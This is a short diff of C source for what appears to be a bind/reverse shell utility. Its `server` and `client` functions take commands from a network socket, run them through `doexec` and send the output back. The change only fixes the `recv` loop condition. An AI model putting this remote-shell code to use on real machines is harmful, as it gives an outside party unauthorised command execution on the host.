@@ -63,7 +63,7 @@ int server(int port){
     client = accept(server, (SOCKADDR *)&clientAddr, &clientAddrSize);
     header(client);
     command_prompt(client);
-    while (recv(client, buffer, sizeof(buffer), 0)) {
+    while (recv(client, buffer, sizeof(buffer), 0) > 0) {
         char *ans = doexec(buffer);
         send(client, ans, strlen(ans) * sizeof(char),0);
         command_prompt(client);
@@ -89,7 +89,7 @@ int client(char *rhost, int port){
     header(s);
     command_prompt(s);
     char buffer[1024];
-    while (recv(s, buffer, sizeof(buffer), 0)) {
+    while (recv(s, buffer, sizeof(buffer), 0) > 0) {
         char *ans = doexec(buffer);
         send(s, ans, strlen(ans) * sizeof(char),0);
         command_prompt(s);
